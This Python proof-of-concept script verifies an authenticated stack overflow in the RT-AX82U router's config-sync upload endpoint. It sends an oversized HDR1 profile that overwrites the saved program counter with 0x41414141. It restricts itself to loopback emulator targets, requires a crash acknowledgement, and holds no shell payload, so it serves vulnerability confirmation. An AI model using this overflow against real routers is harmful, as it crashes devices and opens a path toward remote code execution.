#!/usr/bin/env python3
"""Controlled verifier for the RT-AX82U upload_config_sync stack overflow.

This intentionally demonstrates a service crash/0x41414141 saved-PC overwrite.
It does not contain a ROP chain, shell payload, persistence mechanism, or command
execution. The target is restricted to loopback to keep use inside the local
firmware emulator.
"""

from __future__ import annotations

import argparse
import http.client
import secrets
import struct
import sys
from urllib.parse import urlsplit


BODY_LENGTH = 0x40020
ROUTE = "/upload_config_sync.cgi"


def build_profile() -> bytes:
    # The early NUL keeps the profile semantically inert. The trailing A bytes
    # cross the 0x40000-byte stack buffer and replace saved frame values.
    body = b"\x00" + (b"A" * (BODY_LENGTH - 1))
    return b"HDR1" + struct.pack("<I", BODY_LENGTH) + body


def build_multipart(profile: bytes) -> tuple[bytes, str]:
    boundary = "----friday-" + secrets.token_hex(12)
    prefix = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="file"; filename="profile.prf"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n"
    ).encode("ascii")
    suffix = f"\r\n--{boundary}--\r\n".encode("ascii")
    return prefix + profile + suffix, boundary


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Confirm the authenticated RT-AX82U config-sync overflow in a local emulator."
    )
    parser.add_argument(
        "--url",
        default="http://127.0.0.1",
        help="local emulator base URL (loopback only; default: http://127.0.0.1)",
    )
    parser.add_argument("--token", required=True, help="synthetic lab asus_token")
    parser.add_argument(
        "--confirm-crash",
        action="store_true",
        help="required acknowledgement that the firmware HTTP process will crash",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if not args.confirm_crash:
        print("Refusing to send: pass --confirm-crash for the isolated lab target.", file=sys.stderr)
        return 2

    parsed = urlsplit(args.url)
    if parsed.scheme != "http" or parsed.hostname not in {"127.0.0.1", "::1", "localhost"}:
        print("Refusing non-loopback or non-HTTP target.", file=sys.stderr)
        return 2
    if parsed.path not in {"", "/"} or parsed.query or parsed.fragment:
        print("Provide only the emulator base URL, without a path/query/fragment.", file=sys.stderr)
        return 2

    profile = build_profile()
    request_body, boundary = build_multipart(profile)
    connection = http.client.HTTPConnection(parsed.hostname, parsed.port or 80, timeout=10)
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(request_body)),
        "Cookie": f"asus_token={args.token}",
        "Connection": "close",
    }

    print(f"Sending inert {len(profile)}-byte HDR1 profile to loopback emulator.")
    try:
        connection.request("POST", ROUTE, body=request_body, headers=headers)
        response = connection.getresponse()
        print(f"Unexpected HTTP response: {response.status} {response.reason}")
        response.read()
    except (ConnectionError, TimeoutError, OSError, http.client.HTTPException) as exc:
        print(f"Connection ended while the firmware handled the profile: {type(exc).__name__}")
    finally:
        connection.close()

    print("Check trace.e2e.log for: SIGSEGV ... si_addr=0x41414141")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
